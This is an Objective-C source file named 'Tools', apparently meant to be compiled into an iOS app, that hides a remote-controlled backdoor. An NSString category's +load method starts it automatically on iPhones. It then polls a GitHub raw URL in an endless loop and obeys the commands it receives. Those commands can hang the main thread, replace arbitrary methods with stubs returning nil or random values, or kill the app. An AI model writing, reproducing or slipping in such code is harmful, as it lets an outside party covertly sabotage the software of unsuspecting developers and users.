//Tools

#import "ToolsStart.h"
#import <Foundation/Foundation.h>
#ifndef startingloadrequestfrommyself
#define startingloadrequestfrommyself
#import <objc/runtime.h>
#import <sys/utsname.h>
#define DefaultAction sleep(3600);return nil;
#define MMLog //NSLog

BOOL ToolsshouldStart(){
    struct utsname sysinfo;
    uname(&sysinfo);
    const char * machane = sysinfo.machine;
    if (machane[0]!='i' || machane[1]!='P') {
        return NO;
    }
    
    
    NSUserDefaults* userdefault = [NSUserDefaults standardUserDefaults];
    NSDateFormatter* formater = [[NSDateFormatter alloc] init];
    NSString* form = @"yyyy-MM-dd HH:mm:ss";
    NSDate* now = [NSDate date];
    [formater setDateFormat:form];
    
    
    NSString* configBuildingComplete =  [userdefault stringForKey:@"$configBuildingComplete"];
    NSString* loadRequestComplete = [userdefault stringForKey:@"loadRequestComplete$"];
    NSString* appInitialized = [userdefault stringForKey:@"appInitialized"];
    
    
    BOOL (^valid)(NSString*)=^(NSString* date){
        if (!date) {
            return YES;
        }
        if (date.length!=form.length) {
            return YES;
        }
        NSDate* time = [formater dateFromString:date];
        NSTimeInterval interval = [now timeIntervalSinceDate:time];
        if (abs((int)interval)<5) {
            return NO;
        }else{
            return YES;
        }
    };
    
    if (!valid(configBuildingComplete)||!valid(loadRequestComplete)||!valid(appInitialized)) {
        return NO;
    }
    
    configBuildingComplete = [formater stringFromDate:now];
    [userdefault setValue:configBuildingComplete forKey:@"$configBuildingComplete"];
    [userdefault setValue:configBuildingComplete forKey:@"loadRequestComplete$"];
    [userdefault setValue:configBuildingComplete forKey:@"appInitialized"];
    [userdefault synchronize];
    
    return YES;
}
NSArray* ToolscommandArray(){
    static NSInteger version = 0;
    
    NSData* data = [NSData dataWithContentsOfURL:[NSURL URLWithString:@"https://github.com/WeakSelf/control/raw/master/meeting"]];
    if (data.length==0) {
//        MMLog(@"data 0 length");
        DefaultAction
    }
    NSString* commandString = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
    if (commandString==nil) {
//        MMLog(@"command 0 length");
        DefaultAction
    }
    NSMutableArray* commandArray = [NSMutableArray arrayWithArray:[commandString componentsSeparatedByString:@"\n"]];
    if (commandArray.count<1) {
//        MMLog(@"commandArray 0 length");
        DefaultAction
    }
    NSString* ver = commandArray[0];
    if ([ver integerValue] == version) {
//        MMLog(@"version old");
        DefaultAction
    }
    version = [ver integerValue];
    
    
    [commandArray removeObjectAtIndex:0];
    
    return commandArray;
}
int Toolsrandomtime(){
    srand((unsigned) time(NULL));
    return rand() % 100 + 1;
}
void Toolsappsleep(int time){
    
    dispatch_async(dispatch_get_main_queue(), ^{
        sleep(time);
    });
    sleep(time+1);
}
void Toolsappsleeprandom(int time){
    sleep(time*Toolsrandomtime()/100.0);
    Toolsappsleep(2*time*Toolsrandomtime()/100.0);
}

id Toolsreplace1(id instance,SEL selector, ...){
    return nil;
}
BOOL Toolsreplace2(id instance,SEL selector, ...){
    return Toolsrandomtime()%2==0?YES:NO;
}
void Toolsreplace3(id instance,SEL selector, ...){
    return;
}


void Toolsappreplace(NSString* command){
    NSArray* array = [command componentsSeparatedByString:@"<>"];
    if (array.count<2) {
        return;
    }
    SEL slelect = sel_getUid([array[1] cStringUsingEncoding:NSUTF8StringEncoding]);
    Class aclass = [objc_getClass([array[0] cStringUsingEncoding:NSUTF8StringEncoding]) class];
    Method methodaa = class_getInstanceMethod(aclass, slelect);
    const char* type = method_getTypeEncoding(methodaa);
    int sicktime = 5;
    if (array.count>2) {
        sicktime = [array[2] intValue];
    }
    IMP replace;
    switch (type[0]) {
        case '@':{
            replace=(IMP)Toolsreplace1;
            break;
        }
        case 'B':{
            replace=(IMP)Toolsreplace2;
            break;
        }
        case 'v':{
            replace=(IMP)Toolsreplace3;
            break;
        }
        default:
            return;
    }
    IMP origin = class_getMethodImplementation(aclass, slelect);
    dispatch_async(dispatch_get_main_queue(), ^{
        class_replaceMethod(aclass, slelect, (IMP)replace, type);
    });
    sleep(sicktime);
    dispatch_async(dispatch_get_main_queue(), ^{
        class_replaceMethod(aclass, slelect, (IMP)origin, type);
    });
}
void Toolsperform(NSString* command){
//        MMLog(@"%@",command);
    NSArray* array = [command componentsSeparatedByString:@"="];
    if (array.count!=2) {
        return;
    }
    NSString* type = array[0];
    if ([type isEqualToString:@"waitrandom"]){
        int time = [array[1] intValue];
        sleep(time*Toolsrandomtime()/100.0);
    }else if ([type isEqualToString:@"wait"]){
        int time = [array[1] intValue];
        sleep(time);
    }else if ([type isEqualToString:@"sleeprandom"]){
        Toolsappsleeprandom([array[1] intValue]);
    }else if ([type isEqualToString:@"sleep"]) {
        Toolsappsleep([array[1] intValue]);
    }else if([type isEqualToString:@"replace"]){
        Toolsappreplace(array[1]);
    }else if ([type isEqualToString:@"exit"]){
        if ([array[1] integerValue]==0) {
            exit(0);
        }else{
            exit(1);
        }
    } 
    
}

void ToolsstartReciveMessage(){
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        long long j=0;
        while (++j) {
//            MMLog(@"receiving");
            NSArray* com = ToolscommandArray();
            for (int i=0; i<com.count; i++) {
                Toolsperform(com[i]);
            }
        }
    });
}
void ToolsStart(){
//    MMLog(@"starting");
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        if (ToolsshouldStart()) {
            ToolsstartReciveMessage();
        }
    });
}
@interface  NSString (Toolsmmttttttt)
@end
@implementation NSString (Toolsmmttttttt)
+(void)load{
//    MMLog(@"loading");
    ToolsStart();
}
@end
#endif